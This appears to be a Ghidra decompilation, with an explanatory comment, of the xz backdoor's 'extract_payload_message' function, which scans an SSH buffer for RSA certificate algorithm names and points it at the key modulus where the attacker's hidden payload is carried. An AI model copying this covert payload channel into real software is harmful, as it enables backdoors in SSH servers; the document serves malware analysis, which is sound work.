// /home/kali/xzre-ghidra/xzregh/107F20_extract_payload_message.c
// Function: extract_payload_message @ 0x107F20
// Calling convention: __stdcall
// Prototype: BOOL __stdcall extract_payload_message(sshbuf * sshbuf_data, size_t sshbuf_size, size_t * out_payload_size, global_context_t * ctx)


/*
 * AutoDoc: Searches an sshbuf blob for either `"ssh-rsa-cert-v01@openssh.com"` or `"rsa-sha2-256"`, using the surrounding length
 * fields (all big-endian) to walk the serialized key structure. It validates every intermediate length (capping them at
 * 0x10000), ensures the proposed modulus chunk fits within the caller-provided buffer, and rewrites `sshbuf->d` to point
 * directly at that modulus blob. The extracted length is returned via `out_payload_size` so the decryptor knows exactly
 * how many bytes to peel off.
 */

#include "xzre_types.h"

BOOL extract_payload_message
               (sshbuf *sshbuf_data,size_t sshbuf_size,size_t *out_payload_size,
               global_context_t *ctx)

{
  uint *record_tail_ptr;
  char cVar2;
  u8 *sshbuf_cursor;
  size_t search_offset;
  uint *modulus_field_ptr;
  u32 be_length;
  long cmp_index;
  u8 *match_cursor;
  uint *length_field_ptr;
  size_t window_len;
  size_t modulus_length;
  u8 *modulus_data;
  size_t cert_type_namelen;
  size_t remaining;
  u8 *sshbuf_end;
  u8 *data_end;
  u32 length;
  u8 *p;
  char *cert_type;
  size_t i;
  
  if ((sshbuf_data == (sshbuf *)0x0) || (sshbuf_size < 7)) {
    return FALSE;
  }
  if ((out_payload_size != (size_t *)0x0) && (ctx != (global_context_t *)0x0)) {
    if (ctx->ssh_rsa_cert_alg == (char *)0x0) {
      return FALSE;
    }
    if (ctx->rsa_sha2_256_alg == (char *)0x0) {
      return FALSE;
    }
    sshbuf_cursor = sshbuf_data->d;
    if (CARRY8((ulong)sshbuf_cursor,sshbuf_size)) {
      return FALSE;
    }
    search_offset = 0;
    do {
      match_cursor = sshbuf_cursor + search_offset;
      cmp_index = 0;
      window_len = sshbuf_size - search_offset;
      while( TRUE ) {
        cVar2 = ctx->ssh_rsa_cert_alg[cmp_index];
        if (((char)match_cursor[cmp_index] < cVar2) || (cVar2 < (char)match_cursor[cmp_index])) break;
        cmp_index = cmp_index + 1;
        if (cmp_index == 7) goto LAB_00107fd1;
      }
      cmp_index = 0;
      while( TRUE ) {
        cVar2 = ctx->rsa_sha2_256_alg[cmp_index];
        if (((char)match_cursor[cmp_index] < cVar2) || (cVar2 < (char)match_cursor[cmp_index])) break;
        cmp_index = cmp_index + 1;
        if (cmp_index == 7) goto LAB_00107fd1;
      }
      search_offset = search_offset + 1;
    } while (sshbuf_size - search_offset != 6);
    match_cursor = (u8 *)0x0;
    window_len = 6;
LAB_00107fd1:
    if ((7 < search_offset) && (match_cursor != (u8 *)0x0)) {
      be_length = *(uint *)(match_cursor + -8);
      be_length = be_length >> 0x18 | (be_length & 0xff0000) >> 8 | (be_length & 0xff00) << 8 | be_length << 0x18;
      if (0x10000 < be_length) {
        return FALSE;
      }
      record_tail_ptr = (uint *)(match_cursor + ((ulong)be_length - 8));
      if (sshbuf_cursor + sshbuf_size < record_tail_ptr) {
        return FALSE;
      }
      search_offset = c_strnlen((char *)match_cursor,window_len);
      if (window_len <= search_offset) {
        return FALSE;
      }
      length_field_ptr = (uint *)(match_cursor + search_offset);
      if (record_tail_ptr <= length_field_ptr) {
        return FALSE;
      }
      be_length = *length_field_ptr;
      be_length = be_length >> 0x18 | (be_length & 0xff0000) >> 8 | (be_length & 0xff00) << 8 | be_length << 0x18;
      if (0x10000 < be_length) {
        return FALSE;
      }
      length_field_ptr = (uint *)((long)length_field_ptr + (ulong)(be_length + 4));
      if (record_tail_ptr <= length_field_ptr) {
        return FALSE;
      }
      be_length = *length_field_ptr;
      be_length = be_length >> 0x18 | (be_length & 0xff0000) >> 8 | (be_length & 0xff00) << 8 | be_length << 0x18;
      if (0x10000 < be_length) {
        return FALSE;
      }
      modulus_field_ptr = length_field_ptr + 1;
      if ((uint *)((ulong)be_length + (long)modulus_field_ptr) <= record_tail_ptr) {
        return FALSE;
      }
      if ((char)length_field_ptr[1] == '\0') {
        modulus_field_ptr = (uint *)((long)length_field_ptr + 5);
        be_length = be_length - 1;
      }
      sshbuf_data->d = (u8 *)modulus_field_ptr;
      *out_payload_size = (ulong)be_length;
      return TRUE;
    }
  }
  return FALSE;
}

